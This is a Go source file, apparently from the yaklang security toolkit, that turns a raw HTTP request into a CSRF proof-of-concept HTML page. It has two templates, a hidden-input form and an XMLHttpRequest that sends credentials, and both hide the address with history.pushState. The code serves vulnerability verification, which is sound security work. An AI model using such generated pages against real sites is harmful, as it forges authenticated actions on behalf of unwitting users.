package yaklib

import (
	"errors"
	"html/template"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"reflect"
	"strconv"
	"strings"

	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
)

var csrfFormTemplate = template.Must(template.New("csrf-form").Parse(strings.TrimSpace(`
<html>
<body>
<form action="{{.Url}}" method="{{.Method}}" name="form1" {{if eq .Method "POST"}}enctype="{{.EncType}}"{{end}} >
{{- range .Inputs }}
<input type="{{.Type}}" name="{{.Name}}" value="{{.Value}}"/>
{{- end }}
<input type="submit" value="Submit request" />
</form>
<script>history.pushState('', '', '/');</script>
</body>
</html>
`)))

var csrfJSTemplate = template.Must(template.New("csrf-js").Parse(strings.TrimSpace(`
<html>
<body>
<script>history.pushState('', '', '/')</script>
<script>
function submitRequest()
{
var xhr = new XMLHttpRequest();
xhr.open("{{.Method}}", "{{.Url}}", true);
xhr.setRequestHeader("Accept", "*\/*");
xhr.setRequestHeader("Content-Type", "{{.ContentType}}");
xhr.withCredentials = true;
var body = {{.Body}};
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhr.send(new Blob([aBody]));
}
</script>
<form action="#">
<input type="button" value="Submit request" onclick="submitRequest();" />
</form>
</body>
</html>
`)))

type _csrfKeyValues struct {
	Type  template.HTMLAttr
	Name  template.HTMLAttr
	Value template.HTMLAttr
}
type _csrfTemplateConfig struct {
	Url         any
	Method      any
	ContentType any
	EncType     any
	Body        any
	Inputs      []_csrfKeyValues
}

type _csrfConfig struct {
	MultipartDefaultValue bool
	https                 bool
}

func newDefaultCsrfConfig() *_csrfConfig {
	return &_csrfConfig{
		MultipartDefaultValue: false,
	}
}

type csrfConfig func(c *_csrfConfig)

// Generate 根据传入的原始请求报文生成跨站请求伪造(CSRF)类型的漏洞验证(POC)，返回生成的POC HTML字符串与错误
// Example:
// ```
// csrfPoc, err = csrf.Generate("POST / HTTP/1.1\r\nHost:example.com\r\nContent-Type:application/x-www-form-urlencoded\r\n\r\nname=1&age=2")
// ```
func GenerateCSRFPoc(raw interface{}, opts ...csrfConfig) (string, error) {
	var (
		packet     []byte
		u          *url.URL
		req        *http.Request
		rawBody    []byte
		method     string
		key, value string
		values     []string
		builder    = &strings.Builder{}

		config         *_csrfConfig
		templateConfig *_csrfTemplateConfig

		tmpl *template.Template = csrfFormTemplate
		err  error
	)

	switch raw.(type) {
	case string:
		packet = []byte(raw.(string))
	case []byte:
		packet = raw.([]byte)
	default:
		return "", utils.Errorf("raw type cannot support: %s", reflect.TypeOf(raw))
	}

	config = newDefaultCsrfConfig()
	for _, opt := range opts {
		opt(config)
	}

	u, err = lowhttp.ExtractURLFromHTTPRequestRaw(packet, config.https)
	if err != nil {
		return "", utils.Wrap(err, "extract url failed")
	}

	req, err = lowhttp.ParseBytesToHttpRequest(packet)
	if err != nil {
		return "", utils.Wrap(err, "parse request failed")
	}

	method = strings.ToUpper(req.Method)

	if config.MultipartDefaultValue {
		tmpl = csrfJSTemplate
		templateConfig = &_csrfTemplateConfig{
			Url:    template.JSStr(u.String()),
			Method: template.JSStr(method),
			Inputs: make([]_csrfKeyValues, 0),
		}
	} else {
		templateConfig = &_csrfTemplateConfig{
			Url:     template.HTMLAttr(u.String()),
			Method:  template.HTMLAttr(method),
			EncType: template.HTMLAttr("application/x-www-form-urlencoded"),
			Inputs:  make([]_csrfKeyValues, 0),
		}
	}

	for key, values = range req.Header {
		if strings.ToUpper(key) != "CONTENT-TYPE" {
			continue
		}
		for _, value = range values {
			templateConfig.ContentType = value
			if strings.Contains(strings.ToLower(value), "multipart/form-data;") {
				if tmpl == csrfFormTemplate {
					templateConfig.EncType = template.HTMLAttr(value)
				} else if tmpl == csrfJSTemplate {
					templateConfig.ContentType = template.JSStr(value)
				}
				break
			} else if strings.Contains(strings.ToLower(value), "application/json") {
				break
			}
		}
		break
	}

	rawBody, err = ioutil.ReadAll(req.Body)
	if tmpl == csrfJSTemplate {
		templateConfig.Body = template.JS(strconv.Quote(string(rawBody)))
	}
	if err != nil && !errors.Is(err, io.EOF) {
		return "", utils.Wrap(err, "read body failed")
	}
	if len(rawBody) > 0 {
		params, _, err := lowhttp.GetParamsFromBody(utils.InterfaceToString(templateConfig.ContentType), rawBody)
		if err != nil {
			return "", utils.Wrap(err, "get params from body failed")
		}
		for _, param := range params.Items {
			for _, value := range param.Values {
				templateConfig.Inputs = append(templateConfig.Inputs, _csrfKeyValues{"hidden", template.HTMLAttr(param.Key), template.HTMLAttr(value)})
			}
		}
	} else {
		vals := lowhttp.ParseQueryParams(strings.TrimSpace(string(u.RawQuery)))
		for _, item := range vals.Items {
			templateConfig.Inputs = append(templateConfig.Inputs, _csrfKeyValues{"hidden", template.HTMLAttr(item.Key), template.HTMLAttr(item.Value)})
		}
	}

	err = tmpl.Execute(builder, templateConfig)
	if err != nil {
		return "", err
	}

	return builder.String(), nil
}

// multipartDefaultValue 手动设置请求报文是否为multipart/form-data类型
// 如果设置为true，则会生成使用JavaScript提交的漏洞验证(POC)
// Example:
// ```
// csrfPoc, err = csrf.Generate("POST / HTTP/1.1\r\nHost:example.com\r\nContent-Type:application/x-www-form-urlencoded\r\n\r\nname=1&age=2", csrf.MultipartDefaultValue(true))
// ```
func CsrfOptWithMultipartDefaultValue(b bool) csrfConfig {
	return func(c *_csrfConfig) {
		c.MultipartDefaultValue = b
	}
}

// https 手动设置请求报文是否为HTTPS类型
// Example:
// ```
// csrfPoc, err = csrf.Generate("POST / HTTP/1.1\r\nHost:example.com\r\nContent-Type:application/x-www-form-urlencoded\r\n\r\nname=1&age=2", csrf.HTTPS(true))
// ```
func CsrfOptWithHTTPS(b bool) csrfConfig {
	return func(c *_csrfConfig) {
		c.https = b
	}
}

var CSRFExports = map[string]interface{}{
	"Generate":              GenerateCSRFPoc,
	"multipartDefaultValue": CsrfOptWithMultipartDefaultValue,
	"https":                 CsrfOptWithHTTPS,
}
